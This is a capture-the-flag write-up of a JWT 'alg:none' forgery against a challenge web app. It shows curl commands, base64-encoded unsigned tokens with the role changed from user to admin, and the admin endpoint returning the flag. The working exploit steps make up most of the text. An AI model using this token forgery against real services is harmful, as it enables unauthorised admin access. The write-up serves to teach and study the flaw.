# Exploit write-up — JWT `alg:none` forge (privilege escalation)

**Target:** `http://54.72.82.22:8805`  
**Vuln class:** Insecure JWT handling — server accepts unsigned tokens (`alg: "none"`) / does not verify signatures or disallows `alg: none`.  
**Impact:** Local user can forge a token with `role: "admin"` and access `/admin` to retrieve the flag.

---

## Summary

The app issues an `auth` cookie containing a JWT. The server accepted a token with header `{"alg":"none","typ":"JWT"}` and did not require/validate a signature. By replacing the token payload to set `"role":"admin"` (and leaving the header as `alg: none`) the `/admin` endpoint accepted the cookie and returned the admin-only flag.

## Steps & commands (what I ran)

1. **Check root endpoint — see cookie and response**
		`curl -s -i http://54.72.82.22:8805/ | sed -n '1,240p'
	Response headers contained
		Set-Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.; Path=/; HttpOnly
	Body:
		{"username":"bob","role":"user","message":"no /admin access"}

2. **Attempted POST/PUT — server doesn't accept those at root**
	`curl -s -X POST -H "Content-Type: application/json" -d '{"username":"bob","role":"admin"}' http://54.72.82.22:8805/ # -> Cannot POST /`

3. **Confirm /admin requires valid token**
    
	`curl -s http://54.72.82.22:8805/admin | sed -n '1,240p' # -> {"error":"invalid token"}`

4. **Forge the JWT cookie by switching role to admin**  
    I crafted a token reusing the same header (alg: none) and a modified payload `{"username":"bob","role":"admin"}`. The server accepted a cookie containing:	`auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9.
	
5. **Present forged cookie to /admin**
    
	`curl -s -i -H "Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9." \   http://54.72.82.22:8805/admin | sed -n '1,240p'`

	Result:
	`{"message":"Welcome, admin!","flag":"saf_ctf{jwT_forgerY_iS_admiN_bY_ediT_ggS}"}`




		
`